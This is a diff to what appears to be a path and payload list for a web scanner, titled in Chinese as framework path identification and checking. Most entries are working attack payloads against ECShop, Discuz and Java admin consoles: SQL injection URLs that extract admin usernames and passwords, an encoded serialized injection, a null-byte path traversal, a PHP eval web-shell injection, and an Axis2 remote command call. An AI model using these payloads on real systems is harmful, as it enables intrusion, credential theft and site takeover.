@@ -1,23 +1,27 @@
+#framework 框架路径识别及检查
+
 manager/html
 console/login/loginForm.jsp
 jmx-console
 web-console
 axis2-admin
 services/Axis2Shell/execCmd?cmd=whoami
-/forum.php?mod=attachment&findpost=ss&aid=1
-/home.php?mod=space&uid=4&do=profile
-/source/plugin/myrepeats/table/table_myrepeats.php
-/source/include/misc/misc_ranklist_index.php
-/source/module/forum/forum_attachment.php
-/uc_server/control/admin/db.php
-/source/plugin/myrepeats/table/table_myrepeats.php
-/install/include/install_lang.php
-/_data/I^(()UU()H.mdb
-/user.php?act=is_registered&username=%ce%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
-/respond.php?code=tenpay&attach=voucher&sp_billno=1 and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `ecs`.ecs_admin_user)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
-/respond.php?code=tenpay&attach=voucher&sp_billno=1
-/ecshop/api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
-/js/calendar.php?lang=../index.php%00.
-/search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
-/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
-/phpMyAdmin/index.php?lang[]=1
+forum.php?mod=attachment&findpost=ss&aid=1
+home.php?mod=space&uid=4&do=profile
+source/plugin/myrepeats/table/table_myrepeats.php
+source/include/misc/misc_ranklist_index.php
+source/module/forum/forum_attachment.php
+uc_server/control/admin/db.php
+source/plugin/myrepeats/table/table_myrepeats.php
+install/include/install_lang.php
+_data/I^(()UU()H.mdb
+user.php?act=is_registered&username=%ce%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
+respond.php?code=tenpay&attach=voucher&sp_billno=1 and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `ecs`.ecs_admin_user)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+respond.php?code=tenpay&attach=voucher&sp_billno=1
+ecshop/api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
+js/calendar.php?lang=../index.php%00.
+search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
+admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
+phpMyAdmin/index.php?lang[]=1
+
+
